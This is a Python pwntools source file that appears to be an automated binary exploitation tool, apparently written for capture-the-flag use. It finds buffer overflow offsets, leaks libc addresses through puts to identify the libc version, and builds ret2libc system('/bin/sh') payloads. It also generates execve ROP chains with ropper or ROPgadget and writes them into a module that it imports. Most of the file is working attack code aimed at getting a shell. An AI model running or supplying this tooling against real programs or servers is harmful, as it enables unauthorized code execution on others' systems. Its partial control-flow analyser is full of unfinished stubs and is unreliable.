from __future__ import absolute_import
from __future__ import print_function
from pwn import *
import os
import random
import re
import shutil
import string
import logging
global config, remlib

def init(confi):
    global config, bufferA, toolpa, rop, e
    context.log_level = "WARNING"
    logGen = log.progress("Stage 1", level=31)
    logGen.status("Booting Up....")
    config = confi
    context.binary = config._elf
    e = config._elf
    rop = ROP(e)
    toolpa = config._toolpa
    logGen.success("Finished!")

    return True


def recvleak(rm):  # TODO recv\n ?
    try:
        tmp = rm.recvline().strip().ljust(context.bytes, b'\x00')
        return u(tmp), rm
    except:
        print("recvLeak didnt work (maybe cleaning too much?)")
        print(tmp)
        exit(0)


def midroll(rm):
    return config.midroll(rm)


def postroll(rm):
    return config.postroll(rm)


def preroll(rm):
    return config.preroll(rm)


def fingad(gadlis):
    return p(rop.find_gadget(gadlis)[0])


def fplt(sym):
    return p(e.plt[sym])


def fsym(sym):
    return p(e.symbols[sym])


def fgot(sym):
    return p(e.got[sym])


def p(x):
    return pack(x)


def u(x):
    return unpack(x)


def randomString(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


def escape_ansi(lin):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', lin)


def i2hs(zahl):
    return str(hex(zahl))


def hs2i(hexstr):
    return int(hexstr, 16)


class OffGet:
    def __init__(self, lib, libcmain):  # lib is id if rem else libcobject
        # print hex(libcmain)

        if remlib:
            cmd = "./ABEToolChain/libcdb/dump " + lib
            os.system(cmd + " > offsets")
            os.system(cmd + " __libc_start_main >> offsets")
            os.system(cmd + " exit >> offsets")
            off = open("offsets", "r")
            offsets = off.read().split("\n")
            off.close()
            os.remove("offsets")
            osplt = lambda x: int((offsets[x]).split(" = ")[1], 0)
            self.offset___libc_start_main_ret = osplt(0)
            self.offset_system = osplt(1)
            self.offset_dup2 = osplt(2)
            self.offset_read = osplt(3)
            self.offset_write = osplt(4)
            self.offset_str_bin_sh = osplt(5)
            self.offset__libc_start_main = osplt(6)
            self.offset_exit = osplt(7)
            self.libcbase = libcmain - self.offset__libc_start_main
            self.BINSH = self.libcbase + self.offset_str_bin_sh
            self.EXIT = self.libcbase + self.offset_exit
            self.SYSTEM = self.libcbase + self.offset_system
        else:
            self.libcbase = libcmain - lib.sym["__libc_start_main"]
            self.BINSH = self.libcbase + next(lib.search(b'/bin/sh'))
            self.SYSTEM = self.libcbase + lib.sym["system"]
            self.EXIT = self.libcbase + lib.sym["exit"]

    def loadBSE(self):
        return p(self.BINSH) + p(self.SYSTEM) + p(self.EXIT)


class libMe:
    def __init__(self):
        self.logGen = log.progress("Stage 3", level=31)
        config._logGen = self.logGen
        self.logGen.status("Ret2Libc Attack!")
        self.symbls = list(map(str, e.plt))
        self.libMain()

    def libMain(self):
        global remlib, bufferA
        remlib = False
        if config._debugfinalPayload:
            context.log_level = "debug"
        if config._manuallibc:  # TODO fix the libc local and manual thingy e.g. LD_PRELOAD??
            libELF = ELF(config._pathtolibc)
        elif config._LocalOnly:
            libELF = e.libc
            config._pathtolibc=libELF.path
            if libELF is None:
                libELF = ELF(config._pathtolibc)
        else:
            remlib = True
            liblist = self.libfinder(config._bufferA)
        self.logGen.status("Libc\s found!")
        if remlib:
            liblist = liblist[::-1]
            for lib in liblist:
                self.logGen.status("Trying now libc " + lib)
                self.libPayloader(lib)
        else:
            if config._debugfinalPayload:
                print(libELF.path)
            self.logGen.status("Trying now libc " + libELF.path)
            self.libPayloader(libELF)
        self.logGen.failure("Nothing worked! Go play some Quake!")
        exit(0)

    def leakloader(self):  # Atomic
        getter = [['pop rdi', 'ret']]
        for gadsym in self.symbls:
            if "puts" == gadsym:
                puts_plt = fplt("puts")
                for gettr in getter:
                    try:
                        getwww = fingad(gettr)
                        libc_start_main = fsym("__libc_start_main")
                        return getwww + libc_start_main + puts_plt, getwww
                    except:
                        print("No " + gettr.join(" "))
                        print("need to implement moar gettr!")
                        exit(0)
                else:
                    print("WWWWOOOPOPOSOPS")
                    print("Need to implement moar leaker(read?)")  # TODO MOAR READ!
                    exit(0)

    def libPayloader(self, lib):
        load, gettr = self.leakloader()
        config._LDPRE = True
        payload = bytes(config._bufferA,"utf-8") + load + p(e.entry)
        rm = self.libsend(payload)
        config._LDPRE = False
        libcmain, rm = recvleak(rm)
        load = OffGet(lib, libcmain).loadBSE()
        payload2 = bytes(config._bufferA,"utf-8") + gettr + load
        rm = midroll(rm)
        self.logGen.status("Sending Payload!")
        try:
            if config._debugfinalPayloadCore:
                config.debugPayload(rm, payload2)
            else:
                config.SnC(rm, payload2)
        except NameError:
            exit(0)
        except:
            pass
            print("Breaking at libPayloader")  # TODO check if needed

    def libleaker(self, buff):
        load, dump = self.leakloader()
        payload = bytes(buff,"utf-8") + load
        if config._debugfinalPayload:
            context.log_level = "debug"
        libcmain, rm = recvleak(self.libsend(payload))
        return libcmain

    def libsend(self, payload):  # Atomic
        rm = preroll(config._LocalOnly)
        rm.sendline(payload)
        rm = postroll(rm)
        return rm

    def libfinder(self, buff):
        libcmain = self.libleaker(buff)
        global toolpa
        liber = lambda x: (x.split("id ")[1]).split(")")[0]
        os.system(toolpa + "libcdb/find __libc_start_main " + hex(libcmain) + ">libcanal")
        lican = open("libcanal", "r")
        licanal = lican.read().split("\n")
        lenli = len(licanal)
        licanal = licanal[:lenli - 1]
        lican.close()
        os.remove("libcanal")
        liblist = list(map(liber, licanal))
        return liblist


class Buff:
    def __init__(self):
        self.payroll = config._payroll
        self.UseCore = config._UseCore

    def finder(self):
        global bufferA
        self.logBuf = log.progress("Stage 2", level=31)
        if self.UseCore:
            self.logBuf.status("Trying to find Buffer with Coredumps!")
            buflen = self.finderCore()
            config._bufferA = buflen * "D"
            return buflen
        else:
            self.logBuf.status("Trying to find Buffer!")
            buflen = self.finderNoCore()
            config._bufferA = buflen * "D"
            return buflen

    def finderCore(self):
        try:
            os.remove("./core")
        except:
            pass
        self.logBuf.status("Buffer lenght = " + str(self.payroll))
        while (True):
            pr = preroll(True)
            self.logBuf.status(str(self.payroll))
            buff = cyclic(self.payroll)
            pr.sendline(buff)
            try:
                context.log_level = "ERROR"
                core = Coredump("./core")
                context.log_level = "WARNING"
            except:
                self.payroll += 100
                continue
            if p(core.fault_addr) not in buff:  # TODO does p instead of p64 work?
                self.payroll += 100
                continue
            else:
                context.log_level = "ERROR"
                tarBufLen = cyclic_find(p(core.fault_addr), n=4)
                context.log_level = "WARNING"
                self.logBuf.success("Finished! Buffer lenght = " + str(tarBufLen) + " Found!")
                return tarBufLen

    def finderNoCore(self):
        while (True):
            pr = preroll(True)
            self.logBuf.status("Buffer lenght = " + str(self.payroll))
            buff = cyclic(self.payroll)
            pr.sendline(buff)
            sleep(0.1)
            if pr.poll() == -11:
                self.logBuf.success("Buffer lenght = " + str(self.payroll + 8) + " Found!")
                return (self.payroll + context.bytes)  # TODO Its probably just because or RBP :D
            else:
                pr.kill()
                pr.close()
                self.payroll += 1


class RoPChain:
    def __init__(self):
        self.generator = config._generator
        self.logRop = log.progress("Stage 3", level=31)
        config._logGen = self.logRop
        self.ShellCom = config._shellcmd
        self.binaryfile = config._binaryfile
        self.ropMain()

    def ropMain(self):
        global bufferA
        with context.local(log_level='ERROR'):
            sleep(0.1)
            ropcode = self.ropchain()
            sleep(0.1)
        if ropcode == None:
            print("empty ropchain ! maybe something broken or wrong attack type!")  # TODO Implement attack logic
            exit(0)
        self.logRop.status("RopChain found! ")
        if type(config._bufferA) is str:
            payload = bytes(config._bufferA,"utf-8") + ropcode
        elif type(config._bufferA) is bytes:
            payload = config._bufferA + ropcode
        else:
            print("buffer not yet found ! @ ropMain")
            exit(0)
        self.logRop.status("connecting to target server!")
        rm = preroll(config._LocalOnly)
        if config._debugfinalPayloadCore:
            config.debugPayload(rm, payload)
        else:
            config.SnC(rm, payload)

    def ropchain(self):  # Todo implement more Generators and features
        global generator
        self.logRop.status("Trying to generate a RopChain with Ropper!")
        gens = {"ropper": self.ropchainRopper, "ropperService": self.ropchainRopper, "RopGad": self.ropchainGadget,
                # TODO wait for RopperService
                "RopGen": self.ropchainGenerator}
        funct = gens.get(self.generator, self.ropchainRopper)
        payload = funct()
        return payload

    def ropchainRopper(self):  # Superfast and working TODO implement more CMDS
        self.logRop.status("")
        Com = "execve "
        if self.ShellCom:
            Com = "'" + Com + "cmd=" + self.ShellCom + "'"
        command = "ropper -f " + self.binaryfile + " --chain " + Com + " > shellcode.txt"
        out = self.chainer(command)
        # =====================================================# checking for failure
        failmsg = "# INSERT SYSCALL GADGET HERE"
        if failmsg in out:
            self.logRop.status("Ropper didnt work! trying ROPgadget now!")
            return self.ropchainGadget()
        # =====================================================#
        code = out.split("generator #\n")[1]
        tes = code.split("\n")
        lentes = len(tes)
        for x in range(lentes):
            tes[x] = tes[x].lstrip()
        res = tes[6:lentes - 2]
        pay = "from struct import pack\n" + tes[4] + "\ndef p(x):\n    return pack('<Q',x)\ndef rebase_0(x):\n    " + \
              tes[4] + "\n    return pack('<Q',x+IMAGE_BASE_0)\ndef loader():\n" + "\n    ".join(
            res) + "\n    return rop"

        self.logRop.status("RopChain Generated! Let's pop some Shells!")
        return self.chainloader(pay)

    def ropchainGadget(self):  # Not working so good but more often used
        command = "ROPgadget --ropchain --binary " + self.binaryfile + " > shellcode.txt"
        out = self.chainer(command)
        # =====================================================# checking for failure
        failmsg = "Can't find"
        if failmsg in out:
            self.logRop.status("ROPgadget didnt work! trying ROPGenerator now!")
            try:
                return self.ropchainGenerator()
            except:
                self.logRop.status("ROPgenerator isnt installed! trying something different now!")
                return None
        # =====================================================#
        code = out.split("# execve generated by ROPgadget")[1]
        tes = code.split("\n")
        lentes = len(tes)
        for x in range(lentes):
            tes[x] = tes[x].lstrip()
        res = tes[4:lentes - 2]
        pay = "def loader():\n    " + "\n    ".join(res) + "\n    return p"
        self.logRop.status("RopChain Generated! Let's pop some Shells!")
        return self.chainloader(pay)

    def ropchainGenerator(self):
        print("not Implemented Yet RopGenerator")  # TODO IMPLEMENT
        exit(0)

    def chainloader(self, pay):
        pay = escape_ansi(pay)
        pay = pay.replace("p = ''","p = b''",1).replace("p += '","p += b'",1)
        module = open("./ABEModules/payloader.py", "w")
        module.write(pay)
        module.close()
        from .payloader import loader
        load = loader()
        module = open("./ABEModules/payloader.py", "w")
        module.write("def loader():\n    return None")
        module.close()
        return load

    def chainer(self, command):
        os.system(command)
        output = open("shellcode.txt", "r")
        out = output.read()
        output.close()
        os.remove("shellcode.txt")
        return out


class LogicParser:

    def __init__(self):
        # TODO stuff
        self.base = e.address
        if config._debugfinalPayload:
            print(i2hs(self.base))
        self.graph = dict()
        self.binfo = dict()
        self.mapline = dict()  # <address> -> linenumber
        self.lines = list()
        self.callmap = dict()  # <address> -> user input function@got
        self.funMap = dict()
        self.gotlook = dict()  # <address> -> function@got
        if config._debugfinalPayload:
            print(i2hs(e.entry))
        self.uincalls = ["__isoc99_scanf", "read", "__isoc99_wscanf", "__isoc99_vsscanf", "__isoc99_sscanf",
                         "__isoc99_vfwscanf", "__isoc99_fscanf", "__vsscanf", "__isoc99_vfscanf", "__isoc99_vscanf",
                         "__vfscanf", "__isoc99_swscanf", "__isoc99_vswscanf", "__isoc99_vwscanf", "__isoc99_fwscanf",
                         "__libc_read", "__read", "fgets", "gets", "fgetc", "getc", "fread",
                         "fscanf"]  # TODO expand user input functions
        self.outcall = ["puts", "printf", "write"]
        self.failcall =["__stack_chk_fail",]
        self.elf = open(config._binaryfile, "rb")
        self.maplines()
        try:
            self.main = e.sym["main"]
        except:
            self.main = hs2i(self.findMain())
        self.end = 0
        self.stepper = self.mapline[i2hs(self.main)]  # HINT stepper ::= linenumber
        self.uinCallmapper()
        self.oneLiner(self.stepper)
        self.functionMapper()
        self.funMap[i2hs(self.main)]=i2hs(self.end)
        #for key in sorted(self.funMap):
         #   print("%s : %s" % (key, self.funMap[key]))
        #for line in self.lines[self.mapline[i2hs(self.main)]:self.mapline[i2hs(self.end)]]:
         #   print(line)
        config._main = self.main
        config._end = self.end

        #self.logbar=LogicANGR(config)

        # print(self.gotlook)
        # ==========DEBUG=============#
        #for key in sorted(self.graph):
         #   print("%s: %s" % (key, self.graph[key]))
        # ==========DEBUG=============#
    def selectAnalMode(self, choice):
        modes = {"patch": self.patchMain, "revIfs": self.revIfsMain}
        funct = modes.get(choice)
        funct()

    def revIfsMain(self):
        self.patchMain()
        # ==========DEBUG=============#
        if config._debugfinalPayload:
            for key in sorted(self.graph):
                print("%s: %s" % (key, self.graph[key]))
        # ==========DEBUG=============#
        firstin = "AAAAAAAA"
        inlist = self.refIfs([firstin])[:-1]
        config._input = inlist
        if config._debugfinalPayload:
            print(inlist)

    def refIfs(self, inputlist):
        if config._debugfinalPayload:
            print("=====Inputlist=====")
            print (inputlist)
            print("=====Inputlist=====")
        tlines = self.ltracer(e.path, inputlist)
        step = -1
        lastin = inputlist[-1]
        outputs = list()
        while (True):
            step += 1
            line = tlines[step]
            if "exited" in line:
                break
            naddr = i2hs(self.base + hs2i(line.split("[")[1].split("]")[0]))
            call = line.split("] ")[1].split("(")[0]
            if call in self.outcall:
                if '"' in line:
                    strout = line.split('"')[1]
                    if config._debugfinalPayload:
                        print("Caught Call " + call)
                    if "puts" in call:
                        outputs.append(strout)
                    elif "write" in call:
                        fp = line.split("(")[1].split(",")[0]
                        if "1" is fp:
                            outputs.append(strout)
                        else:
                            print("Write filepointer :" + fp)
                    # TODO implement printf
                    # self.binfo["lbefore"]=line.split('"')[1]
                    continue
                else:
                    print("Implement case for read from pointer" + line)
                    # TODO Implement case for read from pointer
                    # should not be needed...
                    exit(0)
            elif call in self.uincalls:
                outputs = list()
                if config._debugfinalPayload:
                    print("CAUGHT UINPUT " + call)
                # TODO? Stuff?
                continue
            elif "strncmp" == call:
                if lastin in line:
                    # TODO catch strings like ""test""
                    a = line.split('"')[1]
                    b = line.split('"')[3]
                    if a not in b or b not in a:
                        if lastin in a:
                            comp = b
                        else:
                            comp = a
                        if "AAAAAAAA" in lastin:  # This case marks first cycle
                            inputlistn = [comp, "BBBBBBBB"]
                            return self.refIfs(inputlistn)
                        else:
                            inputlistn = (inputlist[:-1]).extend([comp, "BBBBBBBB"])
                            return self.refIfs(inputlistn)
                    else:
                        print("TESTCASE?")
                        continue
            else:
                if config._debugfinalPayload:
                    print("Unknown call :" + call)
        config._output = outputs
        return inputlist


    def revEmuMain(self,addri,callpath,result,precon=None):
        addr = addri
        first=True
        for i in range(len(callpath)-1,0,-1):
            jump=callpath[i]
            if not first:
                addr = jump[list(jump.keys())[0]]
                print("NEw Addr : " + addr)
            print("Jump : "+str(jump))
            val= jump[list(jump.keys())[0]]#jump.keys()[0]
            print ("Value : "+ val)
            print ("addr : "+addr)
            s , e = self.findFunc(val)
            if not (hs2i(s) <= hs2i(addr) <= hs2i(e)):
                if first:
                    print("Skipping Jump")
                    continue
                else:
                    print("Found End")
                    return None

            result,precon=self.revEmu(s,addr,result,precon)
            first = False
        return result,precon


    def revEmu(self,addr_start,addr_end,result,precon=None):
        if config._debugfinalPayload and False:
            print("Start : "+addr_start+" End : "+ addr_end)

        startline=self.mapline[addr_start]
        endline=self.mapline[addr_end]
        for linum in range(endline,startline,-1):
            line=self.lines[linum]
            addr = self.addFline(linum)
            if addr in self.graph:
                turn=self.graph[addr]
                type=turn["type"]
                if type == "call_function":
                    if config._debugfinalPayload:
                        print("Call to Subfunction at : "+addr)
                    result = self.logbar.traceEmu(turn["tarAddrFalse"],addr_end,result,precon)
                    startsub=turn["tarAddrTrue"]
                    endsub=self.funMap[startsub]
                    reslut , precon = self.revEmu(startsub,endsub,result,precon)
                    addr_end= self.addFline(linum - 1)
                elif type == "uinput":
                    print("mach Mal LoL")
                else:
                    pass        #TODO implement? if any.... :D

        return self.logbar.traceEmu(addr_start,addr_end,result,precon),precon

    def findFunc(self,addr):
        for x in self.funMap.keys():
            y=self.funMap[x]
            if hs2i(x) <= hs2i(addr) <= hs2i(y):
                print(x+" : "+y)
                return (x,y)
            else:
                pass

    def findMain(self):
        linum = self.mapline[i2hs(e.entry)]
        while (True):
            line = self.lines[linum]
            if "call" in line:
                linum -= 1
                break
            else:
                linum += 1
        line = self.lines[linum]
        tar = i2hs(hs2i(line.split(" 0x")[1]))
        if config._debugfinalPayload:
            print(tar)
        return tar

    def patchMain(self):
        try:
            shutil.rmtree("./tmp/")
        except:
            pass
        try:
            os.mkdir("./tmp")
        except:
            pass
        boolist = []
        callpath=list()
        e.save(e.path.split(config._binaryfile)[0] + "tmp/" + config._binaryfile)
        self.patchELF("./tmp/" + config._binaryfile, i2hs(self.main), None, False, [i2hs(self.main)], 0, boolist,callpath)
        shutil.rmtree("./tmp/")  # TODO? comment line to keep files for testing

    def uinCallmapper(self):

        for key in e.got:
            self.gotlook[i2hs(e.got[key])] = key
        for x in self.uincalls:
            try:
                self.callmap[i2hs(e.got[x])] = x
            except:
                pass
        # TODO dict of {<address> : function that takes user input,...}
        pass

    def oneLiner(self, stepper):
        while (True):
            line = self.lines[stepper]
            addr = self.addFline(stepper)
            if "jmp" in line:
                if addr not in self.graph:
                    tat = self.appendJmp(addr, line)
                    self.oneLiner(self.mapline[tat])
                    break  # TODO really break?
            elif "j" in line:
                tat = i2hs(self.base + hs2i(line.split(" 0x")[1]))
                if addr not in self.graph:
                    tat = self.appendConJump(addr, line, stepper)
                    self.oneLiner(self.mapline[tat])
                elif (self.graph[addr])["type"] is not "loop" and hs2i(tat)<hs2i(addr):
                    tat = self.anLoop(addr, line, stepper)
                stepper += 1
                continue
            elif "call" in line:
                if addr not in self.graph:
                    self.isCallInput(addr, line)
                stepper += 1
                continue
            elif "leave" in line:
                if addr not in self.graph:  # TODO check if "if" is needed?
                    self.appendEnd(addr)
                break
            elif "ret" in line:
                if addr not in self.graph:  # TODO check if "if" is needed?
                    self.appendRet(addr)
                break
            else:
                stepper += 1
    def findfunctionEnd(self,addr_start):
        for key in sorted(self.graph):
            addr = self.graph[key]
            if hs2i(key)>hs2i(addr_start) and (addr["type"] == "ret" or addr["type"] == "end"):
                return self.addFline(self.mapline[key] - 1)

    def functionMapper(self):
        for key in sorted(self.graph):
            jump=self.graph[key]
            if jump["type"] is "call_function":
                self.funMap[jump["tarAddrTrue"]]=self.findfunctionEnd(jump["tarAddrTrue"])

    def patchELF(self, tmpfilename, adr, ret, uin, checklist, inum, boolist,callpath):
        tmpname = "./tmp/" + config._binaryfile
        # print(tmpfilename)

        tmp = ELF("" + tmpfilename)
        nextname = randomString(6)
        tmpnext = tmpname + nextname
        linum = self.mapline[adr]
        while (True):
            addr = self.addFline(linum)
            if addr in self.graph:

                # print("Got in")

                turn = self.graph[addr]
                type = turn["type"]
                if type == "jmp":

                    # print("jumping")
                    ncallpath = callpath
                    ncallpath.append({turn["tarAddrTrue"]:addr})
                    bol = list(boolist)
                    bol.extend([{adr: {"typ": None, "tar": turn["tarAddrTrue"]}}])
                    self.patchELF(tmpfilename, turn["tarAddrTrue"], None, uin, checklist, inum, bol,ncallpath)
                    break
                elif type == "conjmp" or type == "loop":    #TODO VIC (Very Important Code) own case for loop!!!!
                    if turn["tarAddrTrue"] not in checklist:
                        tmp.asm(hs2i(addr), "jmp " + i2hs(hs2i(turn["tarAddrTrue"]) - self.base))
                        tmp.save(tmpnext)
                        checklist.append(turn["tarAddrTrue"])
                        ncallpath=list(callpath)
                        ncallpath.append({turn["tarAddrTrue"]:addr})
                        bol = list(boolist)
                        bol.extend([{adr: {"typ": True, "tar": turn["tarAddrTrue"]}}])
                        self.patchELF(tmpnext, turn["tarAddrTrue"], None, uin, checklist, inum, bol,ncallpath)
                    tmp.asm(hs2i(addr), "nop")
                    tmp.save(tmpnext)
                    checklist.append(turn["tarAddrFalse"])
                    bol = list(boolist)
                    bol.extend([{adr: {"typ": False, "tar": turn["tarAddrFalse"]}}])
                    self.patchELF(tmpnext, turn["tarAddrFalse"], None, uin, checklist, inum, bol,callpath)
                    break
                elif type == "end":
                    if uin:
                        self.checkVuln(tmpfilename, boolist,callpath)
                    else:
                        pass
                        # print("dead end detected!")

                    break
                elif type == "call_function":
                    ncallpath = callpath
                    ncallpath.append({turn["tarAddrTrue"]: addr})
                    self.patchELF(tmpfilename, turn["tarAddrTrue"], turn["tarAddrFalse"], uin, checklist, inum, boolist,ncallpath)
                    break  # TODO do i need a break here??
                elif type == "ret":

                    # print("returning")

                    self.patchELF(tmpfilename, ret, None, uin, checklist, inum, boolist,callpath)
                    break
                elif type == "uinput":
                    inum += 1
                    if "flags" in turn:
                        flags = turn["flags"]
                        flags["InputNum"] = inum

                    else:
                        turn["flags"] = {"InputNum": 1}

                    uin = True
                    pass
                elif type == "call_libc":
                    if turn["conditionType"] is "__stack_chk_fail":
                        break
                else:
                    print("forgot Type :" + type)
                    exit(0)
                linum += 1
            else:
                linum += 1
                # print("Next line")

    def isCallInput(self, addr, line):
        # TODO check if user Input gets called(scanf)
        tar = i2hs(self.base + hs2i(line.split(" 0x")[1]))
        taf = self.addFline(self.mapline[addr] + 1)
        calltar = self.followJmp(tar)
        if calltar is None:  # Checks if call target is a function or a stub(libc)
            self.graph[addr] = {"type": "call_function", "tarAddrTrue": tar, "tarAddrFalse": taf, "conditionType": None}
            self.oneLiner(self.mapline[tar])
        elif calltar in self.callmap:
            self.graph[addr] = {"type": "uinput", "tarAddrTrue": calltar, "tarAddrFalse": taf,
                                "conditionType": self.callmap[calltar]}
        else:
            self.graph[addr] = {"type": "call_libc", "tarAddrTrue": calltar, "tarAddrFalse": taf,
                                "conditionType": self.gotlook[self.followJmp(tar)]}

    def anLoop(self, addr, line, linenumber):
        tat = i2hs(self.base + hs2i(line.split(" 0x")[1]))
        taf = self.addFline(linenumber + 1)
        con = line.split("j")[1].split(" ")[0]
        loopCon = "TODO"            #TODO implement loop condition reversing x
        self.graph[addr] = {"type": "loop", "tarAddrTrue": tat, "tarAddrFalse": taf,"conditionType": con,"loopCon":loopCon}
        return tat

    def appendConJump(self, addr, line, linenumber):
        tat = i2hs(self.base + hs2i(line.split(" 0x")[1]))
        taf = self.addFline(linenumber + 1)
        self.graph[addr] = {"type": "conjmp", "tarAddrTrue": tat, "tarAddrFalse": taf,
                            "conditionType": line.split("j")[1].split(" ")[0]}
        return tat

    def appendJmp(self, addr, line):
        # TODO add start / target address to map and set flags according to conditionals
        tat = i2hs(self.base + hs2i(line.split(" 0x")[1]))
        self.graph[addr] = {"type": "jmp", "tarAddrTrue": tat, "tarAddrFalse": None, "conditionType": None}
        return tat
        pass

    def appendEnd(self, addr):
        # TODO mark DeadEnd in map
        endaddr = hs2i(self.addFline(self.mapline[addr] + 1))
        #print(endaddr)
        #print(self.end)
        if self.end < endaddr:
            self.end = endaddr
        self.graph[addr] = {"type": "end", "tarAddrTrue": None, "tarAddrFalse": None, "conditionType": None}

    def appendRet(self, addr):
        # TODO mark Ret in map
        self.graph[addr] = {"type": "ret", "tarAddrTrue": None, "tarAddrFalse": None, "conditionType": None}

    def foreachDo(self):
        # TODO run function for each conditional or config
        pass

    def followJmp(self, addr):
        try:
            lin = self.mapline[addr]
            line = self.lines[lin]
        except:
            print("Error Address not mapped!")
            exit(0)
        try:
            return i2hs(self.base + hs2i(line.split(" 0x")[1]))
        except:
            return None

    def addFline(self, linenumber):  # TODO optimize by building a dict: <linenumber> -> <address> once
        return list(self.mapline.keys())[list(self.mapline.values()).index(linenumber)]

    def maplines(self):
        step = 0
        try:
            self.lines = disasm(self.elf.read()).split("\n")
        except:
            print("Disasm errored ! is it a binary?")
            exit(0)
        while (True):
            try:
                line = self.lines[step]
                # print(line)
            except:
                break
            if "..." in line:
                step += 1
                continue
            elif ":" in line:
                self.mapline[i2hs(self.base + hs2i(line.split(":")[0].strip()))] = step
                step += 1
            else:
                print(repr(line))
                print(step)
                print("Whoopsi")
                break
        # print("DONE")
        # print self.mapline

    def readELFline(self, address):
        try:
            return self.lines[self.mapline[i2hs(address)]]
        except:
            print("Address " + i2hs(address) + " not mapped!")
            exit(0)

    def ltracer(self, binary, cmdlist):  # return list of outputlines of ltrace
        cmd = "ltrace -i -s 100 -o lout " + binary
        p = process(cmd, shell=True)
        for x in range(len(cmdlist)):
            input = cmdlist[x]
            resp = p.clean()
            p.sendline(input)
        p.clean()
        out = open("lout", "r")
        resp = out.read()
        out.close()
        os.remove("lout")
        resp = resp.split("\\n")
        resp = "".join(resp)
        if config._debugfinalPayload:
            print("========LtraceS=======")
            print(resp)
            print("========LtraceE=======")
        return resp.split("\n")

    def checkVuln(self, tmpfilename, boolist,callpath):
        print(boolist)      #TODO fix missing main in funMap!!!!!!!!!!!!!!!
        print("====PATH====")
        print(callpath)
        print("====PATH====")

        result,precon=self.revEmuMain("0x4012ba",callpath,"String")


        # TODO catch case of revIfs
        # TODO check if user input has vuln
        pass


# TODO json / dict file :
#   {"<address1>":{"type":type,"tarAddrTrue":<address>,"tarAddrFalse":<address>,"conditionType":<condition>,"flags":<flags>},"address2":...   }
#   <type> ::= jmp/conjmp/uinput/end/call (init)/ret
#   <condition> ::= gt/nz/z/eq/.../NONE for unconditional
#   <flags> ::= single Val(firstInput)/dict of more info
#   tarAddrTrue ::= <address> for jumping or NONE if uinput/end
#   tarAddrFalse ::= <address> for next line or NONE



